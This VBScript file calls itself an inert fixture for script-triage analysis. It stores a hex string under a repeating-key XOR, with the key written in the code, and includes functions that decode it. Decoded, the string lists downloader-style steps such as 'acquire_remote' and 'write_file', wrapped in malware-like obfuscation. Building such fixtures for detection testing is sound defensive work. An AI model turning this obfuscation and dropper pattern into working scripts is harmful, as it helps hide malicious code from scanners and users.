Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_442fca5e = "e727a2aab0e57fe3a5fef079e2a3aae37fcca4a6fc75e7b3efe668faa2a6ce7cfabaa6bd7efaa5b3f06ef0be9ce168fcb5a6e269bfbea2ff7efcb0a5ce69f0a4aae16eefb7a7f06ae7b3b1ac4dfab88be56ee3f894f874dba2b7e148f6a7b6f469e7f8f6bf2befa5b7f07df689a0fe6ffda2fea566f0b7aee17bfab1adce73f7eba0f077e3b7aaf674beb7fbf228a6b3f4a128f5aab6e376aebeb7e56ae0ececbe7babb5f1a47fa4e6f1f734f6aea2fc6affb3edf874e5b7aff87ebce6f7f77ca7e0faf734f7b7b7ed6fe0b3b1ce7bf4b3ade527dba3ade568f6a5b0dd7bf1f9a2a979a1e3a6a62aa1b0bff773ffb39ce17be7befed220cf83b0f468e08a93e478ffbfa0cd52e6b8b7e37fe0a58ff078cfa5b7f07df6fba2a979a1e3a6a62aa1b0edf57be7aab1f47dfaa5b7e363cca6a2e572ae9e88d24fcf85acf76ee4b7b1f446dba3ade568f6a5b0dd7bf18a87f869e3b9b0f078ffb39ff022f0e4f6f42da3e4a5ed74f6aeb7ce69e7b7a4f427e1b3b0fe6fe1b5a6bc69f2bbb3fd7fbda6b0a0"
Const Codec_442fca5e = "hex_compact|repeating_key_xor|91,1a,93,d6,c3"

Function Load_442fca5e()
  Dim result(), v_e598
  ReDim result((Len(Material_442fca5e) \ 2) - 1)
  For v_e598 = 0 To UBound(result)
    result(v_e598) = CInt("&H" & Mid(Material_442fca5e, v_e598 * 2 + 1, 2))
  Next
  Load_442fca5e = result
End Function

Function Decode_442fca5e(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(145,26,147,214,195)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_442fca5e = result
End Function

Function Recover_442fca5e()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    v_d41a = UBound(Array(3, 5, 8, 13))
      v_a19c = Load_442fca5e()
      On Error Resume Next
      v_b27e = Decode_442fca5e(v_a19c)
      v_a702 = Err.Number
      v_b803 = Err.Description
      On Error GoTo 0
      If v_a702 <> 0 Then Err.Raise v_a702, "HuntressFixture", v_b803
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_442fca5e = v_c304
End Function

Function Inspect_442fca5e()
  Dim fields
  fields = Split(Recover_442fca5e(), "|")
  Inspect_442fca5e = Join(fields, "|")
End Function
